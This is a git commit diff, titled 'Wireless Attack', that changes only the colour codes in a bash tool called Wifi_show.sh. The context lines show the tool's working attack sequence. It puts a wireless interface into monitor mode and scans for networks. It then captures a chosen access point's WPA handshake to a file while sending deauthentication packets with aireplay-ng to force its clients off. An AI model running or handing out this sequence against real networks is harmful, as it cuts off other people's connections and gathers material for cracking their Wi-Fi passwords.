f315899967599bc34cf0e58dc1a7960cb516d52a
Md. Asif Karim Chayon <mchayon201366@bscse.uiu.ac.bd>
2021-07-01 18:31:14 +0600

    Wireless Attack

--- Wifi_show.sh
+++ Wifi_show.sh
@@ -2,10 +2,10 @@
 #Edited By 9yon6yon-6yon
 loading() {
 clear
-printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[8;93m Run as super user, e.g.\e[0m\e[8;96m sudo bash filename.sh \e[8;93m or\e[0m \e[0m\e[8;96m./filename.sh\n"
+printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;93m Run as super user, e.g.\e[0m\e[1;96m sudo bash filename.sh \e[1;93m or\e[0m \e[0m\e[1;96m./filename.sh\n"
 sleep 2
 clear
-printf "\e[1;93m"
+printf "\e[1;31m"
 printf "\n▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒ Loading ...\n"
 sleep 0.1
 clear
@@ -55,7 +55,7 @@ loading
 clear
 #see current interfaces
 ifconfig
-read -p $' \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[8;93m Select an interface: \e[0m\e[1;96m\en' interface
+read -p $' \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;93m Select an interface: \e[0m\e[1;96m\en' interface
 #starting monitor mode
 airmon-ng check kill
 clear
@@ -74,9 +74,9 @@ mode="${interface}mon"
 sleep 2
 #discover wifi networks
 airodump-ng $mode
-read -p $' \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[8;93m Enter BSSID               : \e[0m\e[1;96m\en' bssid
-read -p $' \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[8;93m Enter Channel             : \e[0m\e[1;96m\en' ch
-read -p $' \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[8;93m Enter Handshake File Name : \e[0m\e[1;96m\en' f_name
+read -p $' \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[4;93m Enter BSSID               : \e[0m\e[1;96m\en' bssid
+read -p $' \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[4;93m Enter Channel             : \e[0m\e[1;96m\en' ch
+read -p $' \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[4;93m Enter Handshake File Name : \e[0m\e[1;96m\en' f_name
 sleep 3
 gnome-terminal --geometry=80x22+10 -e "airodump-ng -c $ch --bssid $bssid -w $f_name $mode" 
 gnome-terminal --geometry=80x22+0+500 -e "aireplay-ng -0 50 -a $bssid $mode" 
@@ -113,7 +113,7 @@ clear
 exit
 }
 while true; do
-printf "\nPress \e[1;93m q\e[0m \e[0m\e[10;96m to stop monitor mode\n"
+printf "\nPress \e[1;93m q\e[0m \e[9;93m to stop monitor mode\e[0m\n"
 read -r input
 if [ "$input" = "q" ];then
 stop
